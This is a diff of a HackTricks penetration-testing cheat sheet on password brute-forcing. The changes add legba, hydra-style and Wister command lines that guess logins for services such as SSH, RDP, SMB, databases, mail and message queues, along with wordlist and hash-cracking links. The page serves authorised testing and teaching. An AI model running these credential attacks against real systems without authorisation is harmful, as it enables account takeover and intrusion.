@@ -1,22 +1,24 @@
 # Brute Force - CheatSheet
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 <details>
 
-<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+Other ways to support HackTricks:
+
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
@@ -35,6 +37,7 @@ Get Access Today:
 * [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
 * [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
 * [**https://many-passwords.github.io/**](https://many-passwords.github.io)
+* [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
 ## **Create your own Dictionaries**
 
@@ -67,6 +70,29 @@ Generate passwords based on your knowledge of the victim (names, dates...)
 python3 cupp.py -h
 ```
 
+### [Wister](https://github.com/cycurity/wister)
+
+A wordlist generator tool, that allows you to supply a set of words, giving you the possibility to craft multiple variations from the given words, creating a unique and ideal wordlist to use regarding a specific target.
+
+```bash
+python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
+
+ __          _______  _____ _______ ______ _____  
+ \ \        / /_   _|/ ____|__   __|  ____|  __ \ 
+  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
+   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  / 
+    \  /\  /   _| |_ ____) |  | |  | |____| | \ \ 
+     \/  \/   |_____|_____/   |_|  |______|_|  \_\
+
+      Version 1.0.3                    Cycurity    
+      
+Generating wordlist...
+[########################################] 100%
+Generated 67885 lines.
+
+Finished in 0.920s.
+```
+
 ### [pydictor](https://github.com/LandGrey/pydictor)
 
 ### Wordlists
@@ -74,16 +100,21 @@ python3 cupp.py -h
 * [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
 * [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
 * [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
-* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/carlospolop/hacktricks/tree/95b16dc7eb952272459fc877e4c9d0777d746a16/google/fuzzing/tree/master/dictionaries/README.md)
+* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
 * [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
+* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
+* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
+* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
+* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
+* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Services
 
@@ -107,10 +138,18 @@ msf> run
 nmap --script ajp-brute -p 8009 <IP>
 ```
 
+## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+
+```bash
+legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
+```
+
 ### Cassandra
 
 ```bash
 nmap --script cassandra-brute -p 9160 <IP>
+# legba ScyllaDB / Apache Casandra
+legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
 ```
 
 ### CouchDB
@@ -138,6 +177,7 @@ hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordl
 hydra -l root -P passwords.txt [-t 32] <IP> ftp
 ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
+legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
 
 ### HTTP Generic Brute
@@ -150,6 +190,14 @@ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
 # Use https-get mode for https
 medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
+legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
+```
+
+### HTTP - NTLM
+
+```bash
+legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
+legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
 
 ### HTTP - Post Form
@@ -165,6 +213,7 @@ For http**s** you have to change from "http-post-form" to "**https-post-form"**
 
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
+# Check also https://github.com/evilsocket/legba/wiki/HTTP
 ```
 
 ### IMAP
@@ -173,6 +222,7 @@ cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
 nmap -sV --script imap-brute -p <PORT> <IP>
+legba imap --username user --password data/passwords.txt --target localhost:993
 ```
 
 ### IRC
@@ -216,12 +266,14 @@ jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibm
 
 ```bash
 nmap --script ldap-brute -p 389 <IP>
+legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
 ```
 
 ### MQTT
 
 ```
 ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
+legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt 
 ```
 
 ### Mongo
@@ -229,6 +281,13 @@ ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
 ```bash
 nmap -sV --script mongodb-brute -n -p 27017 <IP>
 use auxiliary/scanner/mongodb/mongodb_login
+legba mongodb --target localhost:27017 --username root --password data/passwords.txt
+```
+
+### MSSQL
+
+```bash
+legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
 ```
 
 ### MySQL
@@ -242,6 +301,9 @@ msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false
 
 # medusa
 medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
+
+#Legba
+legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
 ```
 
 ### OracleSQL
@@ -266,6 +328,8 @@ msf> set SID <SID>
 
 #for some reason nmap fails sometimes when executing this script
 nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
+
+legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
 
 In order to use **oracle\_login** with **patator** you need to **install**:
@@ -274,7 +338,7 @@ In order to use **oracle\_login** with **patator** you need to **install**:
 pip3 install cx_Oracle --upgrade
 ```
 
-[Offline OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
+[Offline OracleSQL hash bruteforce](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):
 
 ```bash
  nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
@@ -285,6 +349,12 @@ pip3 install cx_Oracle --upgrade
 ```bash
 hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
 hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
+
+# Insecure
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110
+
+# SSL
+legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
 ```
 
 ### PostgreSQL
@@ -296,6 +366,7 @@ ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
 patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
 use auxiliary/scanner/postgres/postgres_login
 nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
 ```
 
 ### PPTP
@@ -312,6 +383,7 @@ cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
 ```bash
 ncrack -vv --user <User> -P pwds.txt rdp://<IP>
 hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
 ```
 
 ### Redis
@@ -320,6 +392,7 @@ hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
 msf> use auxiliary/scanner/redis/redis_login
 nmap --script redis-brute -p 6379 <IP>
 hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
+legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
 ```
 
 ### Rexec
@@ -354,6 +427,14 @@ nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/va
 hydra -l root -P passwords.txt <IP> rtsp
 ```
 
+### SFTP
+
+```bash
+legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+```
+
 ### SNMP
 
 ```bash
@@ -368,6 +449,7 @@ hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt ta
 ```bash
 nmap --script smb-brute -p 445 <IP>
 hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
 ```
 
 ### SMTP
@@ -375,25 +457,17 @@ hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
 ```bash
 hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
 hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
+legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
 ```
 
 ### SOCKS
 
 ```bash
 nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
+# With alternative address
+legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
 ```
-
-### SSH
-
-```bash
-hydra -l root -P passwords.txt [-t 32] <IP> ssh
-ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
-medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
-patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
-```
-
-#### Weak SSH keys / Debian predictable PRNG
-Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generated sets of weak keys are also available such as [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
 
 ### SQL Server
 
@@ -406,12 +480,45 @@ nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=cust
 msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
 ```
 
+### SSH
+
+```bash
+hydra -l root -P passwords.txt [-t 32] <IP> ssh
+ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
+medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
+patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
+legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
+# Try keys from a folder
+legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
+```
+
+#### Weak SSH keys / Debian predictable PRNG
+
+Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Pre-generated sets of weak keys are also available such as [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).
+
+### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
+
+The STOMP text protocol is a widely used messaging protocol that **allows seamless communication and interaction with popular message queueing services** such as RabbitMQ, ActiveMQ, HornetQ, and OpenMQ. It provides a standardized and efficient approach to exchange messages and perform various messaging operations.
+
+```bash
+legba stomp --target localhost:61613 --username admin --password data/passwords.txt
+```
+
 ### Telnet
 
 ```bash
 hydra -l root -P passwords.txt [-t 32] <IP> telnet
 ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
+
+legba telnet \
+    --username admin \
+    --password wordlists/passwords.txt \
+    --target localhost:23 \
+    --telnet-user-prompt "login: " \
+    --telnet-pass-prompt "Password: " \
+    --telnet-prompt ":~$ " \
+    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
 ```
 
 ### VNC
@@ -422,7 +529,8 @@ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
 ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
 patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
 use auxiliary/scanner/vnc/vnc_login
-nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
+nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
+legba vnc --target localhost:5901 --password data/passwords.txt
 
 #Metasploit
 use auxiliary/scanner/vnc/vnc_login
@@ -436,19 +544,20 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Local
 
 ### Online cracking databases
 
 * [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
+* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
 * [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, and archives MSOffice, ZIP, PDF...)
 * [https://crackstation.net/](https://crackstation.net) (Hashes)
 * [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
@@ -607,7 +716,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### Cisco
 
-<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 ### DPAPI Master Key
 
@@ -638,13 +747,13 @@ zip -r file.xls .
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
 
 ## Tools
 
@@ -789,20 +898,22 @@ Cracking Common Application Hashes
 
 <details>
 
-<summary><strong><a href="https://www.twitch.tv/hacktricks_live/schedule">🎙️ HackTricks LIVE Twitch</a> Wednesdays 5.30pm (UTC) 🎙️ - <a href="https://www.youtube.com/@hacktricks_LIVE">🎥 Youtube 🎥</a></strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+Other ways to support HackTricks:
+
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
-![](<../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.io/) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
